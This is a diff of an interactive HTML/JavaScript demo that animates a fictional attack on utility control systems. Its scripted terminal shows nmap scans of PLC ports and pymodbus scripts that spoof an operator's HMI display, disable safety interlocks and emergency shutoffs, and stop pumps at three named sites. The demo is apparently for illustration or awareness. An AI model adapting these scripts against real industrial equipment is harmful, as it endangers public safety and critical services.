+  // ═════════════════════════════════════════════
+  //  Stage 2: THE PIVOT — IT→OT Network Discovery
+  // ═════════════════════════════════════════════
+  [
+    {out:'# ──────────────────────────────────────────────', c:'dim'},
+    {out:'#  PHASE 2: Crossing the IT/OT boundary', c:'comment'},
+    {out:'# ──────────────────────────────────────────────', c:'dim'},
+    {out:''},
+    {cmd:'ip route show', prompt:'admin@RDIG-DC01:~$'},
+    {gap:300},
+    {out:'default via 10.10.1.1 dev eth0'},
+    {out:'10.10.1.0/24 dev eth0 proto kernel scope link src 10.10.1.5'},
+    {out:'10.20.0.0/24 via 10.10.1.1 dev eth0', c:'warn'},
+    {gap:300},
+    {out:''},
+    {out:'# Discovered route to OT network 10.20.0.0/24', c:'comment'},
+    {out:'# No firewall rules blocking IT → OT traffic', c:'comment'},
+    {out:''},
+    {gap:400},
+    {cmd:'nmap -sS -sV -p 502,102,44818,20000,47808 10.20.0.0/24 \\', prompt:'admin@RDIG-DC01:~$'},
+    {out:'    --open -oN ot_scan.txt', c:'cmd'},
+    {gap:1200},
+    {out:''},
+    {out:'Starting Nmap 7.94 ( https://nmap.org )', c:'dim'},
+    {out:'Scanning 256 hosts [5 ports/host]', c:'dim'},
+    {gap:500},
+    {out:''},
+    {out:'Nmap scan report for 10.20.0.37 (RDIG-SUB-ASHBURN)', c:'header'},
+    {out:'HOST IS UP (0.0012s latency)'},
+    {out:'PORT      STATE  SERVICE       VERSION'},
+    {out:'502/tcp   open   modbus        Schneider Modicon M340', c:'warn'},
+    {out:'102/tcp   closed s7comm'},
+    {out:''},
+    {out:'Nmap scan report for 10.20.0.41 (RDIG-WATER-TREAT)', c:'header'},
+    {out:'HOST IS UP (0.0018s latency)'},
+    {out:'PORT      STATE  SERVICE       VERSION'},
+    {out:'502/tcp   open   modbus        Allen-Bradley ControlLogix', c:'warn'},
+    {out:'44818/tcp open   EtherNet/IP   Rockwell Automation', c:'warn'},
+    {out:''},
+    {out:'Nmap scan report for 10.20.0.55 (RDIG-SUB-SOUTH)', c:'header'},
+    {out:'HOST IS UP (0.0021s latency)'},
+    {out:'PORT      STATE  SERVICE       VERSION'},
+    {out:'502/tcp   open   modbus        Schneider Modicon M340', c:'warn'},
+    {gap:400},
+    {out:''},
+    {out:'Nmap done: 256 IP addresses (3 hosts up) scanned in 14.23s', c:'dim'},
+    {gap:700},
+    {out:''},
+    {out:'# ──────────────────────────────────────────────', c:'dim'},
+    {out:'#  Fingerprinting PLCs via Modbus', c:'comment'},
+    {out:'# ──────────────────────────────────────────────', c:'dim'},
+    {out:''},
+    {cmd:'nmap --script modbus-discover -p 502 10.20.0.37', prompt:'admin@RDIG-DC01:~$'},
+    {gap:800},
+    {out:'PORT    STATE SERVICE'},
+    {out:'502/tcp open  modbus'},
+    {out:'| modbus-discover:'},
+    {out:'|   sid 0x01:'},
+    {out:'|     Slave ID data: \\xc3\\x41\\x02\\x00', c:'dim'},
+    {out:'|     Device: Schneider Electric', c:'info'},
+    {out:'|     Model:  Modicon M340 (BMX P34 2020)', c:'info'},
+    {out:'|     FW:     3.20 (OUTDATED — current: 3.60)', c:'err'},
+    {out:'|_    Status: RUN mode — accepting remote writes', c:'err'},
+    {gap:400},
+    {out:''},
+    {cmd:'nmap --script modbus-discover -p 502 10.20.0.41', prompt:'admin@RDIG-DC01:~$'},
+    {gap:600},
+    {out:'| modbus-discover:'},
+    {out:'|   sid 0x01:'},
+    {out:'|     Device: Allen-Bradley', c:'info'},
+    {out:'|     Model:  ControlLogix 5580 (1756-L85E)', c:'info'},
+    {out:'|     FW:     32.011 (2 major versions behind)', c:'err'},
+    {out:'|_    Status: RUN mode — no authentication required', c:'err'},
+    {gap:400},
+    {out:''},
+    {out:'[!] CRITICAL: 3 PLCs accepting unauthenticated Modbus writes', c:'err'},
+    {out:'[!] No Modbus authentication or whitelisting detected', c:'err'},
+  ],
+
+  // ═════════════════════════════════════════════
+  //  Stage 3: THE ILLUSION — HMI Spoofing
+  // ═════════════════════════════════════════════
+  [
+    {out:'# ──────────────────────────────────────────────', c:'dim'},
+    {out:'#  PHASE 3: HMI display manipulation', c:'comment'},
+    {out:'#  Freeze operator\'s screen at safe value', c:'comment'},
+    {out:'# ──────────────────────────────────────────────', c:'dim'},
+    {out:''},
+    {cmd:'cat hmi_spoof.py', prompt:'attacker@kali:~$'},
+    {gap:300},
+    {out:''},
+    {out:'#!/usr/bin/env python3', c:'info'},
+    {out:'"""', c:'comment'},
+    {out:'HMI Display Spoofing — Loss of Situational Awareness', c:'comment'},
+    {out:'Target: Schneider Modicon M340 at Ashburn Substation', c:'comment'},
+    {out:'Modbus Register Map (from eng workstation docs):', c:'comment'},
+    {out:'  HR 100 = Live system pressure (PSI)', c:'comment'},
+    {out:'  HR 101 = HMI display override register', c:'comment'},
+    {out:'  HR 102 = HMI refresh lock (1 = frozen)', c:'comment'},
+    {out:'"""', c:'comment'},
+    {out:''},
+    {out:'from pymodbus.client import ModbusTcpClient', c:'info'},
+    {out:'import time', c:'info'},
+    {out:''},
+    {out:"TARGET = '10.20.0.37'"},
+    {out:'UNIT   = 0x01'},
+    {out:''},
+    {out:'client = ModbusTcpClient(TARGET, port=502)'},
+    {out:'client.connect()'},
+    {out:'print(f"[*] Connected to PLC at {TARGET}")'},
+    {out:''},
+    {out:'# Step 1: Read the real value'},
+    {out:'rr = client.read_holding_registers(100, 1, slave=UNIT)'},
+    {out:'real_psi = rr.registers[0]'},
+    {out:'print(f"[*] Current live PSI: {real_psi}")'},
+    {out:''},
+    {out:'# Step 2: Write a safe-looking value to the HMI override', c:'warn'},
+    {out:'client.write_register(101, 75, slave=UNIT)', c:'warn'},
+    {out:'print("[+] HMI override register set to 75 PSI")'},
+    {out:''},
+    {out:'# Step 3: Lock the HMI refresh so it can\'t update', c:'warn'},
+    {out:'client.write_register(102, 1, slave=UNIT)', c:'warn'},
+    {out:'print("[+] HMI refresh locked — display frozen")'},
+    {out:''},
+    {out:'# Step 4: Confirm the operator sees the fake value'},
+    {out:'verify = client.read_holding_registers(101, 1, slave=UNIT)'},
+    {out:'print(f"[+] HMI now displays: {verify.registers[0]} PSI")'},
+    {out:''},
+    {out:'client.close()'},
+    {out:'print("[+] Operator is now blind. Proceeding to Stage 4...")'},
+    {gap:700},
+    {out:''},
+    {cmd:'python3 hmi_spoof.py', prompt:'attacker@kali:~$'},
+    {gap:900},
+    {out:'[*] Connected to PLC at 10.20.0.37', c:'info'},
+    {out:'[*] Current live PSI: 72'},
+    {out:'[+] HMI override register set to 75 PSI', c:'success'},
+    {out:'[+] HMI refresh locked — display frozen', c:'success'},
+    {out:'[+] HMI now displays: 75 PSI', c:'success'},
+    {out:'[+] Operator is now blind. Proceeding to Stage 4...', c:'success'},
+    {gap:600},
+    {out:''},
+    {out:'┌──────────────────────────────────────────┐', c:'warn'},
+    {out:'│  CONTROL ROOM SCREEN                     │', c:'warn'},
+    {out:'│                                          │', c:'warn'},
+    {out:'│   SYSTEM PRESSURE:  75 PSI   ✓ NORMAL   │', c:'success'},
+    {out:'│   ALL SYSTEMS:      NOMINAL  ✓ OK       │', c:'success'},
+    {out:'│                                          │', c:'warn'},
+    {out:'│  ── REALITY ──────────────────────────── │', c:'warn'},
+    {out:'│   ACTUAL PRESSURE:  climbing...          │', c:'err'},
+    {out:'│   SAFETY RESPONSE:  none — operator      │', c:'err'},
+    {out:'│                     sees no anomaly       │', c:'err'},
+    {out:'└──────────────────────────────────────────┘', c:'warn'},
+  ],
+
+  // ═════════════════════════════════════════════
+  //  Stage 4: THE PHYSICS BREACH — PLC Override
+  // ═════════════════════════════════════════════
+  [
+    {out:'# ──────────────────────────────────────────────', c:'dim'},
+    {out:'#  PHASE 4: Direct PLC manipulation', c:'comment'},
+    {out:'#  Disable safety interlocks + kill main pump', c:'comment'},
+    {out:'# ──────────────────────────────────────────────', c:'dim'},
+    {out:''},
+    {cmd:'cat plc_override.py', prompt:'attacker@kali:~$'},
+    {gap:300},
+    {out:''},
+    {out:'#!/usr/bin/env python3', c:'info'},
+    {out:'"""', c:'comment'},
+    {out:'PLC Safety Override — Code → Kinetic Impact', c:'comment'},
+    {out:'Target: Modicon M340 + ControlLogix 5580', c:'comment'},
+    {out:'Coil Map (extracted from engineering workstation):', c:'comment'},
+    {out:'  Coil 1  = Main Water Pump A (ON/OFF)', c:'comment'},
+    {out:'  Coil 2  = Main Water Pump B (ON/OFF)', c:'comment'},
+    {out:'  Coil 5  = Safety Interlock Loop (ENABLED/DISABLED)', c:'comment'},
+    {out:'  Coil 10 = High-Temp Emergency Shutoff', c:'comment'},
+    {out:'"""', c:'comment'},
+    {out:''},
+    {out:'from pymodbus.client import ModbusTcpClient', c:'info'},
+    {out:'import time', c:'info'},
+    {out:''},
+    {out:'plcs = ['},
+    {out:"    ('10.20.0.37', 'Ashburn Substation'),"},
+    {out:"    ('10.20.0.55', 'South Substation'),"},
+    {out:"    ('10.20.0.41', 'Water Treatment'),"},
+    {out:']'},
+    {out:''},
+    {out:'for addr, name in plcs:'},
+    {out:'    client = ModbusTcpClient(addr, port=502)'},
+    {out:'    client.connect()'},
+    {out:'    print(f"\\n[*] Connected to {name} ({addr})")'},
+    {out:''},
+    {out:'    # Disable safety interlock', c:'warn'},
+    {out:'    client.write_coil(5, False, slave=1)', c:'err'},
+    {out:'    print(f"[!] Safety interlock DISABLED on {name}")'},
+    {out:''},
+    {out:'    # Disable high-temp emergency shutoff', c:'warn'},
+    {out:'    client.write_coil(10, False, slave=1)', c:'err'},
+    {out:'    print(f"[!] High-temp shutoff DISABLED on {name}")'},
+    {out:''},
+    {out:'    # Kill main pumps', c:'warn'},
+    {out:'    client.write_coil(1, False, slave=1)', c:'err'},
+    {out:'    client.write_coil(2, False, slave=1)', c:'err'},
+    {out:'    print(f"[!] Main pumps A+B OFF on {name}")'},
+    {out:''},
+    {out:'    client.close()'},
+    {gap:700},
+    {out:''},
+    {cmd:'python3 plc_override.py', prompt:'attacker@kali:~$'},
+    {gap:1100},
+    {out:''},
+    {out:'[*] Connected to Ashburn Substation (10.20.0.37)', c:'info'},
+    {out:'[!] Safety interlock DISABLED on Ashburn Substation', c:'err'},
+    {out:'[!] High-temp shutoff DISABLED on Ashburn Substation', c:'err'},
+    {out:'[!] Main pumps A+B OFF on Ashburn Substation', c:'err'},
+    {gap:500},
+    {out:''},
+    {out:'[*] Connected to South Substation (10.20.0.55)', c:'info'},
+    {out:'[!] Safety interlock DISABLED on South Substation', c:'err'},
+    {out:'[!] High-temp shutoff DISABLED on South Substation', c:'err'},
+    {out:'[!] Main pumps A+B OFF on South Substation', c:'err'},
+    {gap:500},
+    {out:''},
+    {out:'[*] Connected to Water Treatment (10.20.0.41)', c:'info'},
+    {out:'[!] Safety interlock DISABLED on Water Treatment', c:'err'},
+    {out:'[!] High-temp shutoff DISABLED on Water Treatment', c:'err'},
+    {out:'[!] Main pumps A+B OFF on Water Treatment', c:'err'},
+    {gap:600},
+    {out:''},
+    {out:'═══════════════════════════════════════════════════', c:'err'},
+    {out:'  3 PLCs compromised across all RDIG substations', c:'err'},
+    {out:'  6 safety interlocks DISABLED', c:'err'},
+    {out:'  6 cooling pumps OFFLINE', c:'err'},
+    {out:'  Code has been converted into physical action.', c:'err'},
+    {out:'═══════════════════════════════════════════════════', c:'err'},
+  ],
+
+  // ═════════════════════════════════════════════
+  //  Stage 5: THE FALLOUT — Cascading Failure
+  // ═════════════════════════════════════════════
+  [
+    {out:''},
+    {out:'╔══════════════════════════════════════════════╗', c:'err'},
+    {out:'║  SCADA ALERT MONITOR — ROYAL DUKE INFRA     ║', c:'err'},
+    {out:'║  MULTI-SITE CRITICAL EVENT                  ║', c:'err'},
+    {out:'╚══════════════════════════════════════════════╝', c:'err'},
+    {gap:700},
+    {out:''},
+    {out:'[03:14:07] ASHBURN SUBSTATION', c:'header'},
+    {out:'───────────────────────────────────────────', c:'dim'},
+    {out:'  Cooling supply:   OFFLINE (pumps unresponsive)', c:'err'},
+    {out:'  Safety interlock: DISABLED (override detected)', c:'err'},
+    {gap:500},
+    {out:''},
+    {out:'  THERMAL PROFILE — Ashburn DC Campus:', c:'warn'},
+    {out:'    t+0s    22°C  ████░░░░░░░░░░░░░░░░  NORMAL', c:'success'},
+    {gap:500},
+    {out:'    t+15s   28°C  ███████░░░░░░░░░░░░░  WARNING', c:'warn'},
+    {gap:500},
+    {out:'    t+30s   35°C  ██████████░░░░░░░░░░  CRITICAL', c:'warn'},
+    {gap:500},
+    {out:'    t+45s   42°C  █████████████░░░░░░░  DANGER', c:'err'},
+    {gap:500},
+    {out:'    t+60s   45°C  ████████████████████  SHUTDOWN', c:'err'},
+    {gap:600},
+    {out:''},
+    {out:'[03:15:12] AUTO: Thermal protection triggered — Ashburn', c:'err'},
+    {out:'[03:15:12] AUTO: Emergency power-down initiated', c:'err'},
+    {gap:400},
+    {out:''},
+    {out:'[03:15:18] SOUTH SUBSTATION', c:'header'},
+    {out:'───────────────────────────────────────────', c:'dim'},
+    {out:'  Cooling supply:   OFFLINE', c:'err'},
+    {out:'  Manassas DC Campus: thermal spike detected', c:'err'},
+    {out:'  [03:16:01] AUTO: Emergency shutdown — Manassas', c:'err'},
+    {gap:500},
+    {out:''},
+    {out:'[03:16:44] WATER TREATMENT FACILITY', c:'header'},
+    {out:'───────────────────────────────────────────', c:'dim'},
+    {out:'  Master supply pumps: OFFLINE', c:'err'},
+    {out:'  Tysons DC Campus: cooling water pressure at 0 PSI', c:'err'},
+    {out:'  [03:17:22] AUTO: Emergency shutdown — Tysons', c:'err'},
+    {gap:600},
+    {out:''},
+    {out:'╔══════════════════════════════════════════════╗', c:'err'},
+    {out:'║  CASCADE IMPACT ASSESSMENT                  ║', c:'err'},
+    {out:'╠══════════════════════════════════════════════╣', c:'err'},
+    {out:'║  Server capacity at risk:  4,140 MW         ║', c:'err'},
+    {out:'║  DC facilities impacted:   300+ (Loudoun)   ║', c:'err'},
+    {out:'║  Downstream losses:        $1M+/hr/facility ║', c:'err'},
+    {out:'║  Services affected:        AWS, Azure, GovC ║', c:'err'},
+    {out:'║  Recovery time estimate:   12-72 hours      ║', c:'err'},
+    {out:'╠══════════════════════════════════════════════╣', c:'err'},
+    {out:'║  STATUS: NORTHERN VIRGINIA CLOUD — DARK     ║', c:'err'},
+    {out:'╚══════════════════════════════════════════════╝', c:'err'},
+  ],
+];
+
+// ═══════════════════════════════════════════════
+//  TERMINAL — TYPING ENGINE
+// ═══════════════════════════════════════════════
+let cancelId = 0;
+const termLines = document.getElementById('term-lines');
+const termBody  = document.getElementById('term-body');
+const cursorEl  = document.getElementById('cursor');
+
+function scrollTerm() { termBody.scrollTop = termBody.scrollHeight; }
+function wait(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+async function runTerminal(stageNum, instant) {
+  cancelId++;
+  const myId = cancelId;
+  termLines.innerHTML = '';
+  termLines.appendChild(cursorEl);
+
+  document.getElementById('term-title').textContent = TTITLES[stageNum] || '';
+
+  if (stageNum === 5) termBody.classList.add('alert');
+  else termBody.classList.remove('alert');
+
+  const content = TERM[stageNum];
+  if (!content || !content.length) return;
+
+  for (const item of content) {
+    if (myId !== cancelId) return;
+
+    if (item.gap !== undefined) {
+      if (!instant) await wait(item.gap);
+      continue;
+    }
+
+    if (item.cmd !== undefined) {
+      const div = document.createElement('div');
+      div.className = 'tl';
+      const ps = document.createElement('span');
+      ps.className = 'prompt';
+      ps.textContent = (item.prompt || '$') + ' ';
+      div.appendChild(ps);
+      const cs = document.createElement('span');
+      cs.className = 'cmd';
+      div.appendChild(cs);
+      termLines.insertBefore(div, cursorEl);
+
+      if (instant) {
+        cs.textContent = item.cmd;
+      } else {
+        for (const ch of item.cmd) {
+          if (myId !== cancelId) return;
+          cs.textContent += ch;
+          scrollTerm();
+          await wait(18 + Math.random() * 14);
+        }
+        await wait(280);
+      }
+      scrollTerm();
+      continue;
+    }
+
+    if (item.out !== undefined) {
+      if (!instant) await wait(item.d || 45);
+      const div = document.createElement('div');
+      div.className = 'tl';
+      const s = document.createElement('span');
+      s.className = item.c || 'out';
+      s.textContent = item.out;
+      div.appendChild(s);
+      termLines.insertBefore(div, cursorEl);
+      if (!instant) scrollTerm();
+      continue;
+    }
+  }
+  scrollTerm();
+}
+
+// ═══════════════════════════════════════════════
+//  HUD
+// ═══════════════════════════════════════════════
+function updateHUD() {
+  document.getElementById('stage-counter').textContent =
+    stage === 0 ? 'NORMAL OPERATIONS' : 'STAGE ' + stage + ' / 5';
+  const p = document.getElementById('progress');
+  let h = '';
+  for (let i = 1; i <= 5; i++) h += '<div class="dot' + (i < stage ? ' done' : i === stage ? ' active' : '') + '"></div>';
+  p.innerHTML = h;
+  if (stage > 0) document.getElementById('hud-br').style.opacity = '0';
+}
+
+// ═══════════════════════════════════════════════
+//  STAGE TITLE
+// ═══════════════════════════════════════════════
+let ttl = null;
+function showTitle(s) {
+  const el = document.getElementById('stage-title');
+  el.querySelector('.num').textContent = s.num;
+  el.querySelector('.name').textContent = s.title;
+  el.querySelector('.sub').textContent = s.sub;
+  el.classList.add('vis');
+  clearTimeout(ttl);
+  ttl = setTimeout(() => el.classList.remove('vis'), 2200);
+}
+
+// ═══════════════════════════════════════════════
+//  STAGE MANAGEMENT
+// ═══════════════════════════════════════════════
+function advance() {
+  if (stage >= 5) return;
+  stage++; stageT = 0;
+  camTarget = CAM_TARGETS[stage];
+  showTitle(STAGES[stage]);
+  updateHUD();
+
+  if (stage === 1) {
+    document.getElementById('term-panel').classList.add('vis');
+    setTimeout(() => runTerminal(stage, false), 900);
+  } else {
+    setTimeout(() => runTerminal(stage, false), 400);
+  }
+
+  if (stage === 5) {
+    setTimeout(() => document.getElementById('cascade').classList.add('vis'), 16000);
+  }
+}
+
+function goBack() {
+  if (stage <= 0) return;
+  document.getElementById('cascade').classList.remove('vis');
+  document.getElementById('stage-title').classList.remove('vis');
+  stage--; stageT = 10;
+  camTarget = CAM_TARGETS[stage];
+  updateHUD();
+
+  if (stage === 0) {
+    cancelId++;
+    termLines.innerHTML = '';
+    termLines.appendChild(cursorEl);
+    document.getElementById('term-panel').classList.remove('vis');
+    termBody.classList.remove('alert');
+  } else {
+    runTerminal(stage, true);
+  }
+}
+
+function closeCascade() { document.getElementById('cascade').classList.remove('vis'); }
+
+// ═══════════════════════════════════════════════
+//  MAIN LOOP
+// ═══════════════════════════════════════════════
+function frame(ts) {
+  const dt = lastTs ? (ts - lastTs) / 1000 : .016;
+  lastTs = ts; globalT += dt; stageT += dt;
+  lerpCam(dt);
+  drawBg();
+  drawCounties();
+  drawEdges();
+  drawBoundary();
+  drawAttack();
+  drawNodes();
+  drawDCs();
+  drawDim();
+  requestAnimationFrame(frame);
+}
+
+// ═══════════════════════════════════════════════
+//  INPUT
+// ═══════════════════════════════════════════════
+document.addEventListener('keydown', e => {
+  if (e.key === ' ' || e.key === 'ArrowRight') { e.preventDefault(); advance(); }
+  if (e.key === 'ArrowLeft') { e.preventDefault(); goBack(); }
+  if (e.key === 'Escape') closeCascade();
+});
+canvas.addEventListener('click', advance);
+
+// ═══════════════════════════════════════════════
+//  INIT
+// ═══════════════════════════════════════════════
+updateHUD();
+requestAnimationFrame(frame);
+</script>
+</body>
+</html>
